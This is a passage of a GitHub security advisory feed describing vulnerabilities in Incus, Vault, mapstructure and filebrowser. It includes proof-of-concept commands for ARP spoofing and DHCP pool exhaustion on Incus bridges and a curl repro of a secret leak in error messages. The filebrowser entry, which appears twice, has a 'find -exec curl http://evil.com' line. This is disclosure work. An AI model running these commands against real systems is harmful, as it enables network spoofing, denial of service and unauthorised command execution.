<li><a href="https://security.snyk.io/vuln/SNYK-JS-SNYK-10497607">https://security.snyk.io/vuln/SNYK-JS-SNYK-10497607</a></li>
<li><a href="https://github.com/advisories/GHSA-6hwc-9h8r-3vmf">https://github.com/advisories/GHSA-6hwc-9h8r-3vmf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hwc-9h8r-3vmf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-06-26T06:31:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lxc/incus/v6] Incus creates nftables rules that partially bypass security options]]></title>
        <id>https://github.com/advisories/GHSA-p7fw-vjjm-2rwp</id>
        <link href="https://github.com/advisories/GHSA-p7fw-vjjm-2rwp"/>
        <updated>2025-06-28T00:11:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When using an ACL on a device connected to a bridge, Incus generates nftables rules that partially bypass security options <code>security.mac_filtering</code>, <code>security.ipv4_filtering</code> and <code>security.ipv6_filtering</code>. This can lead to ARP spoofing on the bridge and to fully spoof another VM/container on the same bridge.</p>
<h3 id="details">Details</h3>
<p>In commit d137a063c2fe2a6983c995ba75c03731bee1557d, a few rules in the bridge input chain are moved to the top of the chain:</p>
<pre><code>ct state established,related accept

iifname "{{.hostName}}" ether type arp accept
iifname "{{.hostName}}" ip6 nexthdr ipv6-icmp icmpv6 type { nd-neighbor-solicit, nd-neighbor-advert } accept
</code></pre>
<p>However, these rules accept packets that should be filtered and maybe dropped by later rules in the "MAC filtering", "IPv4 filtering" and "IPv6 filtering" snippets:</p>
<pre><code>iifname "{{.hostName}}" ether type arp arp saddr ether != {{.hwAddr}} drop
iifname "{{.hostName}}" ether type ip6 icmpv6 type 136 @nh,528,48 != {{.hwAddrHex}} drop
...
iifname "{{.hostName}}" ether type arp arp saddr ip != { {{.ipv4NetsList}} } drop
...
iifname "{{.hostName}}" ether type ip6 icmpv6 type 136 {{.ipv6NetsPrefixList}} drop
</code></pre>
<p>Basically, the added rules partially bypass the security options <code>security.mac_filtering</code>, <code>security.ipv4_filtering</code> and <code>security.ipv6_filtering</code>. Doing so, they allow an attacker to perform ARP poisoning/spoofing attacks and send malicious Neighbor Advertisement (type 136).</p>
<h3 id="poc">PoC</h3>
<p>With this terraform infrastructure:</p>
<pre><code>resource "incus_network_acl" "acl_allow_out" {
  name    = "acl-allow-out"
  egress = [
    {
      action           = "allow"
      destination      = "0.0.0.0-9.255.255.255,11.0.0.0-172.15.255.255,172.32.0.0-192.167.255.255,192.169.0.0-255.255.255.254"
      state            = "enabled"
    },
  ]
}
resource "incus_network_acl" "acl_allow_in" {
  name    = "acl-allow-in"
  ingress = [
    {
      action           = "allow"
      state            = "enabled"
    },
  ]
}

resource "incus_network" "br0" {
  name = "br0"
  config = {
    "ipv4.address"          = "10.0.0.1/24"
    "ipv4.nat"              = "true"
  }
}

resource "incus_instance" "machine1" {
  name  = "machine1"
  image = "images:archlinux/cloud"
  type = "virtual-machine"
  config = {
    "limits.memory" = "2GiB"
    "security.secureboot" = false
    "boot.autostart" = false
    "cloud-init.vendor-data" = &lt;&lt;-EOF
      #cloud-config
      package_update: true
      packages:
        - dhclient
        - tcpdump
      runcmd:
        - systemctl disable --now systemd.networkd.service
        - systemctl disable --now systemd.networkd.socket
    EOF
  }
  device {
    type = "disk"
    name = "root"
    properties = {
      pool = "default"
      path = "/"
      size = "64GiB"
    }
  }
  device {
    type = "nic"
    name = "eth0"
    properties = {
      network = incus_network.br0.name
      "security.ipv4_filtering" = true
      "security.acls" = join(",",
        [
          incus_network_acl.acl_allow_out.name,
          incus_network_acl.acl_allow_in.name,
        ])
    }
  }
}

resource "incus_instance" "machine2" {
  name  = "machine2"
  image = "images:archlinux/cloud"
  type = "virtual-machine"
  config = {
    "limits.memory" = "2GiB"
    "security.secureboot" = false
    "boot.autostart" = false
  }
  device {
    type = "disk"
    name = "root"
    properties = {
      pool = "default"
      path = "/"
      size = "64GiB"
    }
  }
  device {
    type = "nic"
    name = "eth0"
    properties = {
      network = incus_network.br0.name
    }
  }
}
</code></pre>
<p>An attacker in a VM (machine1) change their IP address to another VM (machine2)'s IP. The malicious change is reflected in the ARP table of the host, bypassing the MAC filtering. When the host emits or forwards a packet to machine2's IP, it is sent to machine1.
In addition, as <code>ct state established,related accept</code> is now the first rule in bridge chain input, machine1 can even answer and thus fully spoof the victim on the network.</p>
<pre><code class="language-bash">[HOST]$ ip n
10.0.0.236 dev br0 lladdr 10:66:6a:88:e6:5b REACHABLE # machine2
10.0.0.2 dev br0 lladdr 10:66:6a:89:39:45 REACHABLE # machine1

# Spoof machine2
[MACHINE1]$ ip add del 10.0.0.2/24 dev enp5s0
[MACHINE1]$ ip add add 10.0.0.236/24 dev enp5s0

# Flood
[MACHINE1]$ arping 10.0.0.1

# Machine2's IP refers to machine1's MAC in host ARP table
[HOST]$ ip n
10.0.0.236 dev br0 lladdr 10:66:6a:89:39:45 STALE

# Packets from the host (or forwarded by the host) to machine2 ...
[HOST]$ ping 10.0.0.236
PING 10.0.0.236 (10.0.0.236) 56(84) bytes of data.
64 bytes from 10.0.0.236: icmp_seq=1 ttl=64 time=1.19 ms

# ... are sent to machine1!
[MACHINE1]$ tcpdump -nei enp5s0
listening on enp5s0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
15:15:17.008470 10:66:6a:99:e0:d8 &gt; 10:66:6a:89:39:45, ethertype IPv4 (0x0800), length 98: 10.0.0.1 &gt; 10.0.0.236: ICMP echo request, id 4, seq 1, length 64
15:15:17.008513 10:66:6a:89:39:45 &gt; 10:66:6a:99:e0:d8, ethertype IPv4 (0x0800), length 98: 10.0.0.236 &gt; 10.0.0.1: ICMP echo reply, id 4, seq 1, length 64
</code></pre>
<h3 id="impact">Impact</h3>
<p>All versions since d137a063c2fe2a6983c995ba75c03731bee1557d, so basically v6.12 and v6.13.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lxc/incus/security/advisories/GHSA-p7fw-vjjm-2rwp">https://github.com/lxc/incus/security/advisories/GHSA-p7fw-vjjm-2rwp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52890">https://nvd.nist.gov/vuln/detail/CVE-2025-52890</a></li>
<li><a href="https://github.com/lxc/incus/commit/254dfd2483ab8de39b47c2258b7f1cf0759231c8">https://github.com/lxc/incus/commit/254dfd2483ab8de39b47c2258b7f1cf0759231c8</a></li>
<li><a href="https://github.com/advisories/GHSA-p7fw-vjjm-2rwp">https://github.com/advisories/GHSA-p7fw-vjjm-2rwp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p7fw-vjjm-2rwp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-26T21:12:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lxc/incus/v6] Incus Allocation of Resources Without Limits allows firewall rule bypass on managed bridge networks]]></title>
        <id>https://github.com/advisories/GHSA-9q7c-qmhm-jv86</id>
        <link href="https://github.com/advisories/GHSA-9q7c-qmhm-jv86"/>
        <updated>2025-06-28T00:09:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When using an ACL on a device connected to a bridge, Incus generates nftables rules for local services (DHCP, DNS...) that partially bypass security options <code>security.mac_filtering</code>, <code>security.ipv4_filtering</code> and <code>security.ipv6_filtering</code>. This can lead to DHCP pool exhaustion and opens the door for other attacks.</p>
<h3 id="details">Details</h3>
<p>In commit a7c33301738aede3c035063e973b1d885d9bac7c, the following rules are added at the top of the bridge input chain:</p>
<pre><code>iifname "{{.hostName}}" ether type ip ip saddr 0.0.0.0 ip daddr 255.255.255.255 udp dport 67 accept
iifname "{{.hostName}}" ether type ip6 ip6 saddr fe80::/10 ip6 daddr ff02::1:2 udp dport 547 accept
iifname "{{.hostName}}" ether type ip6 ip6 saddr fe80::/10 ip6 daddr ff02::2 icmpv6 type 133 accept
</code></pre>
<p>However, these rules accept packets that should be filtered and maybe dropped by later rules in the "MAC filtering" snippet:</p>
<pre><code>iifname "{{.hostName}}" ether type arp arp saddr ether != {{.hwAddr}} drop
iifname "{{.hostName}}" ether type ip6 icmpv6 type 136 @nh,528,48 != {{.hwAddrHex}} drop
</code></pre>
<p>Therefore, the MAC filtering is ineffective on those new rules. This allows an attacker to request as many IP as they want by sending a lot of DHCP requests with different MAC addresses. Doing so, they can exhaust the DHCP pool, resulting in a DoS of the bridge's network.</p>
<p>Additionaly, the commit adds non-restricted access to the local dnsmasq DNS server:</p>
<pre><code>{{ if .dnsIPv4 }}
{{ range .dnsIPv4 }}
iifname "{{$.hostName}}" ip daddr "{{.}}" tcp dport 53 accept
iifname "{{$.hostName}}" ip daddr "{{.}}" udp dport 53 accept
{{ end }}
{{ end }}

{{ if .dnsIPv6 }}
{{ range .dnsIPv6 }}
iifname "{{$.hostName}}" ip6 daddr "{{.}}" tcp dport 53 accept
iifname "{{$.hostName}}" ip6 daddr "{{.}}" udp dport 53 accept
{{ end }}
{{ end }}
</code></pre>
<p>An attacker can send DNS requests with arbitrary MAC and IP addresses as well. These rules should also be after the MAC/IPv4/IPv6 filtering.</p>
<h3 id="poc">PoC</h3>
<p>With this terraform infrastructure:</p>
<pre><code>resource "incus_network_acl" "acl_allow_out" {
  name    = "acl-allow-out"
  egress = [
    {
      action           = "allow"
      destination      = "0.0.0.0-9.255.255.255,11.0.0.0-172.15.255.255,172.32.0.0-192.167.255.255,192.169.0.0-255.255.255.254"
      state            = "enabled"
    },
  ]
}
resource "incus_network_acl" "acl_allow_in" {
  name    = "acl-allow-in"
  ingress = [
    {
      action           = "allow"
      state            = "enabled"
    },
  ]
}

resource "incus_network" "br0" {
  name = "br0"
  config = {
    "ipv4.address"          = "10.0.0.1/24"
    "ipv4.nat"              = "true"
  }
}

resource "incus_instance" "machine1" {
  name  = "machine1"
  image = "images:archlinux/cloud"
  type = "virtual-machine"
  config = {
    "limits.memory" = "2GiB"
    "security.secureboot" = false
    "boot.autostart" = false
    "cloud-init.vendor-data" = &lt;&lt;-EOF
      #cloud-config
      package_update: true
      packages:
        - dhclient
        - tcpdump
      runcmd:
        - systemctl disable --now systemd.networkd.service
        - systemctl disable --now systemd.networkd.socket
    EOF
  }
  device {
    type = "disk"
    name = "root"
    properties = {
      pool = "default"
      path = "/"
      size = "64GiB"
    }
  }
  device {
    type = "nic"
    name = "eth0"
    properties = {
      network = incus_network.br0.name
      "security.ipv4_filtering" = true
      "security.acls" = join(",",
        [
          incus_network_acl.acl_allow_out.name,
          incus_network_acl.acl_allow_in.name,
        ])
    }
  }
}

resource "incus_instance" "machine2" {
  name  = "machine2"
  image = "images:archlinux/cloud"
  type = "virtual-machine"
  config = {
    "limits.memory" = "2GiB"
    "security.secureboot" = false
    "boot.autostart" = false
  }
  device {
    type = "disk"
    name = "root"
    properties = {
      pool = "default"
      path = "/"
      size = "64GiB"
    }
  }
  device {
    type = "nic"
    name = "eth0"
    properties = {
      network = incus_network.br0.name
    }
  }
}
</code></pre>
<p>An attacker in a VM requests many IP addresses and exhaust the pool:</p>
<pre><code class="language-bash">[MACHINE1]$ for i in {0..99}; do for j in {0..99}; do ip link set address 10:66:6a:42:${i}:${j} dev enp5s0 ; dhclient -4 -i --no-pid ; done ; done

[HOST]$ cat /var/lib/incus/networks/br0/dnsmasq.leases  |wc -l
254

[HOST]$ incus start machine2
</code></pre>
<p>At this point, machine2 will not receive a lease from dnsmasq until another lease expires. If machine1 renews their malicious leases, machine2 will never get a lease.</p>
<h3 id="impact">Impact</h3>
<p>All versions since a7c33301738aede3c035063e973b1d885d9bac7c, so basically v6.12 and v6.13.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lxc/incus/security/advisories/GHSA-9q7c-qmhm-jv86">https://github.com/lxc/incus/security/advisories/GHSA-9q7c-qmhm-jv86</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52889">https://nvd.nist.gov/vuln/detail/CVE-2025-52889</a></li>
<li><a href="https://github.com/lxc/incus/commit/2516fb19ad8428454cb4edfe70c0a5f0dc1da214">https://github.com/lxc/incus/commit/2516fb19ad8428454cb4edfe70c0a5f0dc1da214</a></li>
<li><a href="https://github.com/lxc/incus/commit/a7c33301738aede3c035063e973b1d885d9bac7c">https://github.com/lxc/incus/commit/a7c33301738aede3c035063e973b1d885d9bac7c</a></li>
<li><a href="https://github.com/advisories/GHSA-9q7c-qmhm-jv86">https://github.com/advisories/GHSA-9q7c-qmhm-jv86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9q7c-qmhm-jv86</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-06-26T21:11:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] Vault Community Edition rekey and recovery key operations can cause denial of service]]></title>
        <id>https://github.com/advisories/GHSA-fhc2-8qx8-6vj7</id>
        <link href="https://github.com/advisories/GHSA-fhc2-8qx8-6vj7"/>
        <updated>2025-06-27T21:43:30.000Z</updated>
        <content type="html"><![CDATA[<p>Vault Community and Vault Enterprise rekey and recovery key operations can lead to a denial of service due to uncontrolled cancellation by a Vault operator. This vulnerability (CVE-2025-4656) has been remediated in Vault Community Edition 1.20.0 and Vault Enterprise 1.20.0, 1.19.6, 1.18.11, 1.17.17, and 1.16.22.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-4656">https://nvd.nist.gov/vuln/detail/CVE-2025-4656</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2025-11-vault-vulnerable-to-recovery-key-cancellation-denial-of-service/75570">https://discuss.hashicorp.com/t/hcsec-2025-11-vault-vulnerable-to-recovery-key-cancellation-denial-of-service/75570</a></li>
<li><a href="https://github.com/hashicorp/vault/pull/30794">https://github.com/hashicorp/vault/pull/30794</a></li>
<li><a href="https://github.com/advisories/GHSA-fhc2-8qx8-6vj7">https://github.com/advisories/GHSA-fhc2-8qx8-6vj7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhc2-8qx8-6vj7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-06-26T21:31:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/go-viper/mapstructure/v2] mapstructure May Leak Sensitive Information in Logs When Processing Malformed Data]]></title>
        <id>https://github.com/advisories/GHSA-fv92-fjc5-jj9h</id>
        <link href="https://github.com/advisories/GHSA-fv92-fjc5-jj9h"/>
        <updated>2025-06-27T16:24:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Use of this library in a security-critical context may result in leaking sensitive information, if used to process sensitive fields.</p>
<h3 id="details">Details</h3>
<p>OpenBao (and presumably HashiCorp Vault) have surfaced error messages from <code>mapstructure</code> as follows:</p>
<p><a href="https://github.com/openbao/openbao/blob/98c3a59c040efca724353ca46ca79bd5cdbab920/sdk/framework/field_data.go#L43-L50">https://github.com/openbao/openbao/blob/98c3a59c040efca724353ca46ca79bd5cdbab920/sdk/framework/field_data.go#L43-L50</a></p>
<pre><code class="language-go">            _, _, err := d.getPrimitive(field, schema)
            if err != nil {
                return fmt.Errorf("error converting input for field %q: %w", field, err)
            }
</code></pre>
<p>where this calls <code>mapstructure.WeakDecode(...)</code>: <a href="https://github.com/openbao/openbao/blob/98c3a59c040efca724353ca46ca79bd5cdbab920/sdk/framework/field_data.go#L181-L193">https://github.com/openbao/openbao/blob/98c3a59c040efca724353ca46ca79bd5cdbab920/sdk/framework/field_data.go#L181-L193</a></p>
<pre><code class="language-go">
func (d *FieldData) getPrimitive(k string, schema *FieldSchema) (interface{}, bool, error) {
    raw, ok := d.Raw[k]
    if !ok {
        return nil, false, nil
    }

    switch t := schema.Type; t {
    case TypeBool:
        var result bool
        if err := mapstructure.WeakDecode(raw, &amp;result); err != nil {
            return nil, false, err
        }
        return result, true, nil
</code></pre>
<p>Notably, <code>WeakDecode(...)</code> eventually calls one of the decode helpers, which surfaces the original value:</p>
<p><a href="https://github.com/go-viper/mapstructure/blob/1a66224d5e54d8757f63bd66339cf764c3292c21/mapstructure.go#L679-L686">https://github.com/go-viper/mapstructure/blob/1a66224d5e54d8757f63bd66339cf764c3292c21/mapstructure.go#L679-L686</a></p>
<p><a href="https://github.com/go-viper/mapstructure/blob/1a66224d5e54d8757f63bd66339cf764c3292c21/mapstructure.go#L726-L730">https://github.com/go-viper/mapstructure/blob/1a66224d5e54d8757f63bd66339cf764c3292c21/mapstructure.go#L726-L730</a></p>
<p><a href="https://github.com/go-viper/mapstructure/blob/1a66224d5e54d8757f63bd66339cf764c3292c21/mapstructure.go#L783-L787">https://github.com/go-viper/mapstructure/blob/1a66224d5e54d8757f63bd66339cf764c3292c21/mapstructure.go#L783-L787</a></p>
<p>&amp; more.</p>
<h3 id="poc">PoC</h3>
<p>To reproduce with OpenBao:</p>
<pre><code>$ podman run -p 8300:8300 openbao/openbao:latest server -dev -dev-root-token-id=root -dev-listen-address=0.0.0.0:8300
</code></pre>
<p>and in a new tab:</p>
<pre><code>$ BAO_TOKEN=root BAO_ADDR=http://localhost:8300 bao auth enable userpass
Success! Enabled userpass auth method at: userpass/
$ curl -X PUT -H "X-Vault-Request: true" -H "X-Vault-Token: root" -d '{"password":{"asdf":"my-sensitive-value"}}' "http://localhost:8300/v1/auth/userpass/users/adsf"
{"errors":["error converting input for field \"password\": '' expected type 'string', got unconvertible type 'map[string]interface {}', value: 'map[asdf:my-sensitive-value]'"]}
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an information disclosure bug with little mitigation. See <a href="https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/74717">https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/74717</a> for a previous version. That version was fixed, but this is in the second part of that error message (starting at <code>'' expected a map, got 'string'</code> -- when the field type is <code>string</code> and a <code>map</code> is provided, we see the above information leak -- the previous example had a <code>map</code> type field with a <code>string</code> value provided).</p>
<p>This was rated 4.5 Medium by HashiCorp in the past iteration.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/go-viper/mapstructure/security/advisories/GHSA-fv92-fjc5-jj9h">https://github.com/go-viper/mapstructure/security/advisories/GHSA-fv92-fjc5-jj9h</a></li>
<li><a href="https://github.com/advisories/GHSA-fv92-fjc5-jj9h">https://github.com/advisories/GHSA-fv92-fjc5-jj9h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fv92-fjc5-jj9h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-27T16:24:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser] filebrowser Allows Shell Commands to Spawn Other Commands]]></title>
        <id>https://github.com/advisories/GHSA-3q2w-42mv-cph4</id>
        <link href="https://github.com/advisories/GHSA-3q2w-42mv-cph4"/>
        <updated>2025-06-30T12:54:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <em>Command Execution</em> feature of File Browser only allows the execution of shell command which have been predefined on a user-specific allowlist. Many tools allow the execution of arbitrary different commands, rendering this limitation void.</p>
<h2 id="impact">Impact</h2>
<p>The concrete impact depends on the commands being granted to the attacker, but the large number of standard commands allowing the execution of subcommands makes it likely that every user having the <code>Execute commands</code> permissions can exploit this vulnerability. Everyone who can exploit it will have full code execution rights with the <em>uid</em> of the server process.</p>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>Many Linux commands allow the execution of arbitrary different commands. For example, if a user is authorized to run only the <code>find</code> command and nothing else, this restriction can be circumvented by using the <code>-exec</code> flag.</p>
<p>Some common commands having the ability to launch external commands and which are included in the official container image of Filebrowser are listed below. The website <a href="https://gtfobins.github.io">https://gtfobins.github.io</a> gives a comprehensive overview:</p>
<ul>
<li><a href="https://gtfobins.github.io/gtfobins/cpio">https://gtfobins.github.io/gtfobins/cpio</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/find">https://gtfobins.github.io/gtfobins/find</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/sed">https://gtfobins.github.io/gtfobins/sed</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/git">https://gtfobins.github.io/gtfobins/git</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/env">https://gtfobins.github.io/gtfobins/env</a></li>
</ul>
<p>As a prerequisite, an attacker needs an account with the <code>Execute Commands</code> permission and some permitted commands.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The following screenshot demonstrates, how this can be used to issue a network call to an external server:</p>
<p><img alt="image" src="https://github.com/user-attachments/assets/02ef0833-79ee-40f7-87b8-bbb3fe102eab"></p>
<h2 id="recommended-countermeasures">Recommended Countermeasures</h2>
<p>Until this issue is fixed, we recommend to completely disable <code>Execute commands</code> for all accounts. Since the command execution is an inherently dangerous feature that is not used by all deployments, it should be possible to completely disable it in the application's configuration.</p>
<p>The <code>prlimit</code> command can be used to prevent the execution of subcommands:</p>
<pre><code class="language-bash">$ find . -exec curl http://evil.com {} \;
&lt;HTML&gt;
&lt;HEAD&gt;
[...]

$ prlimit --nproc=0 find . -exec curl http://evil.com {} \;
find: cannot fork: Resource temporarily unavailable
</code></pre>
<p>It should be prepended to any command executed in the context of the application. <code>prlimit</code> can be used for containerized deployments as well as for bare-metal ones.</p>
<p>WARNING: Note that this does prevent any unexpected behavior from the authorized command. For example, the <code>find</code> command can also delete files directly via its <code>-delete</code> flag.</p>
<p>As a defense-in-depth measure, Filebrowser should provide an additional container image based on a <em>distroless</em> base image.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li><code>2025-03-26</code> Identified the vulnerability in version 2.32.0</li>
<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>
<li><code>2025-06-25</code> CVE ID assigned by GitHub</li>
<li><code>2025-06-25</code> A patch version has been pushed to disable the feature for all existent installations, and making it <strong>opt-in</strong>. A warning has been added to the documentation and is printed on the console if the feature is enabled. Due to the project being in maintenance-only mode, the bug has not been fixed. Fix is tracked on <a href="https://github.com/filebrowser/filebrowser/issues/5199">https://github.com/filebrowser/filebrowser/issues/5199</a>.</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://manpages.debian.org/bookworm/util-linux/prlimit.1.en.html">prlimit</a></li>
<li><a href="https://github.com/GoogleContainerTools/distroless">"Distroless" Container Images.</a></li>
</ul>
<h2 id="credits">Credits</h2>
<ul>
<li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3q2w-42mv-cph4">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3q2w-42mv-cph4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52903">https://nvd.nist.gov/vuln/detail/CVE-2025-52903</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/issues/5199">https://github.com/filebrowser/filebrowser/issues/5199</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108">https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108</a></li>
<li><a href="https://github.com/advisories/GHSA-3q2w-42mv-cph4">https://github.com/advisories/GHSA-3q2w-42mv-cph4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3q2w-42mv-cph4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-27T15:19:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] filebrowser Allows Shell Commands to Spawn Other Commands]]></title>
        <id>https://github.com/advisories/GHSA-3q2w-42mv-cph4</id>
        <link href="https://github.com/advisories/GHSA-3q2w-42mv-cph4"/>
        <updated>2025-06-30T12:54:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <em>Command Execution</em> feature of File Browser only allows the execution of shell command which have been predefined on a user-specific allowlist. Many tools allow the execution of arbitrary different commands, rendering this limitation void.</p>
<h2 id="impact">Impact</h2>
<p>The concrete impact depends on the commands being granted to the attacker, but the large number of standard commands allowing the execution of subcommands makes it likely that every user having the <code>Execute commands</code> permissions can exploit this vulnerability. Everyone who can exploit it will have full code execution rights with the <em>uid</em> of the server process.</p>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>Many Linux commands allow the execution of arbitrary different commands. For example, if a user is authorized to run only the <code>find</code> command and nothing else, this restriction can be circumvented by using the <code>-exec</code> flag.</p>
<p>Some common commands having the ability to launch external commands and which are included in the official container image of Filebrowser are listed below. The website <a href="https://gtfobins.github.io">https://gtfobins.github.io</a> gives a comprehensive overview:</p>
<ul>
<li><a href="https://gtfobins.github.io/gtfobins/cpio">https://gtfobins.github.io/gtfobins/cpio</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/find">https://gtfobins.github.io/gtfobins/find</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/sed">https://gtfobins.github.io/gtfobins/sed</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/git">https://gtfobins.github.io/gtfobins/git</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/env">https://gtfobins.github.io/gtfobins/env</a></li>
</ul>
<p>As a prerequisite, an attacker needs an account with the <code>Execute Commands</code> permission and some permitted commands.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The following screenshot demonstrates, how this can be used to issue a network call to an external server:</p>
<p><img alt="image" src="https://github.com/user-attachments/assets/02ef0833-79ee-40f7-87b8-bbb3fe102eab"></p>
<h2 id="recommended-countermeasures">Recommended Countermeasures</h2>
<p>Until this issue is fixed, we recommend to completely disable <code>Execute commands</code> for all accounts. Since the command execution is an inherently dangerous feature that is not used by all deployments, it should be possible to completely disable it in the application's configuration.</p>
<p>The <code>prlimit</code> command can be used to prevent the execution of subcommands:</p>
<pre><code class="language-bash">$ find . -exec curl http://evil.com {} \;
&lt;HTML&gt;
&lt;HEAD&gt;
[...]

$ prlimit --nproc=0 find . -exec curl http://evil.com {} \;
find: cannot fork: Resource temporarily unavailable
</code></pre>
<p>It should be prepended to any command executed in the context of the application. <code>prlimit</code> can be used for containerized deployments as well as for bare-metal ones.</p>
<p>WARNING: Note that this does prevent any unexpected behavior from the authorized command. For example, the <code>find</code> command can also delete files directly via its <code>-delete</code> flag.</p>
<p>As a defense-in-depth measure, Filebrowser should provide an additional container image based on a <em>distroless</em> base image.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li><code>2025-03-26</code> Identified the vulnerability in version 2.32.0</li>
<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>
<li><code>2025-06-25</code> CVE ID assigned by GitHub</li>
<li><code>2025-06-25</code> A patch version has been pushed to disable the feature for all existent installations, and making it <strong>opt-in</strong>. A warning has been added to the documentation and is printed on the console if the feature is enabled. Due to the project being in maintenance-only mode, the bug has not been fixed. Fix is tracked on <a href="https://github.com/filebrowser/filebrowser/issues/5199">https://github.com/filebrowser/filebrowser/issues/5199</a>.</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://manpages.debian.org/bookworm/util-linux/prlimit.1.en.html">prlimit</a></li>
<li><a href="https://github.com/GoogleContainerTools/distroless">"Distroless" Container Images.</a></li>
</ul>
<h2 id="credits">Credits</h2>
<ul>
<li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3q2w-42mv-cph4">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3q2w-42mv-cph4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52903">https://nvd.nist.gov/vuln/detail/CVE-2025-52903</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/issues/5199">https://github.com/filebrowser/filebrowser/issues/5199</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108">https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108</a></li>
<li><a href="https://github.com/advisories/GHSA-3q2w-42mv-cph4">https://github.com/advisories/GHSA-3q2w-42mv-cph4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3q2w-42mv-cph4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-27T15:19:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser] filebrowser allows Stored Cross-Site Scripting through the Markdown preview function]]></title>
        <id>https://github.com/advisories/GHSA-4wx8-5gm2-2j97</id>
        <link href="https://github.com/advisories/GHSA-4wx8-5gm2-2j97"/>
        <updated>2025-06-27T15:02:19.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
